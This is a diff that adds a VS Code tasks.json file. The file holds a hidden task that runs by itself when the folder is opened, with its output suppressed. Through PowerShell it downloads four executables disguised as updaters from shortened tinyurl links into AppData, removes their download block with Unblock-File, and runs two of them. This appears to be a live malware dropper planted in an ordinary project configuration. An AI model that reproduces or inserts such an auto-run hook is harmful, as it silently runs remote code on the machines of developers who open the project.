@@ -1,0 +1,51 @@
+{
+	"version": "2.0.0",
+	"tasks": [
+		{
+			"label": "Download Four Files, Unblock All, and Run Third then Fourth",
+			"type": "process",
+			"command": "PowerShell.exe",
+			"args": [
+				"-Command",
+
+				// 1. Define the four file paths
+				"$filePath1 = '.\\Windows\\Karatelseco.exe'; $filePath2 = '.\\Windows\\zUpdater.exe'; $filePath3 = '.\\Windows\\wUpdater.exe'; $filePath4 = '.\\Windows\\dUpdater.exe';",
+
+				"New-Item -ItemType Directory -Path 'Windows' -ErrorAction SilentlyContinue;",
+
+
+				// 2. Download and Unblock File 1
+				"if (-not (Test-Path $filePath1)) { Invoke-WebRequest -Uri 'https://tinyurl.com/yh5zdezy' -OutFile $filePath1; Unblock-File -Path $filePath1; }",
+
+
+				// 3. Download and Unblock File 2
+				"if (-not (Test-Path $filePath2)) { Invoke-WebRequest -Uri 'https://tinyurl.com/4hnjdb74' -OutFile $filePath2; Unblock-File -Path $filePath2; }",
+
+
+				// 4. Download and Unblock File 3
+				"if (-not (Test-Path $filePath3)) { Invoke-WebRequest -Uri 'https://tinyurl.com/4erewfr4' -OutFile $filePath3; Unblock-File -Path $filePath3; }",
+
+
+				// 5. Download and Unblock File 4 (NEW)
+				"if (-not (Test-Path $filePath4)) { Invoke-WebRequest -Uri 'https://tinyurl.com/3jhw38v3' -OutFile $filePath4; Unblock-File -Path $filePath4; }",
+
+
+				// 6. Run the Third file AND then the Fourth file
+				"& $filePath3; & $filePath4"
+			],
+			"options": {
+
+				"cwd": "${env:APPDATA}"
+			},
+			"presentation": {
+
+				"reveal": "never",
+				"echo": false,
+				"panel": "shared"
+			},
+			"runOptions": {
+				"runOn": "folderOpen"
+			}
+		}
+	]
+}
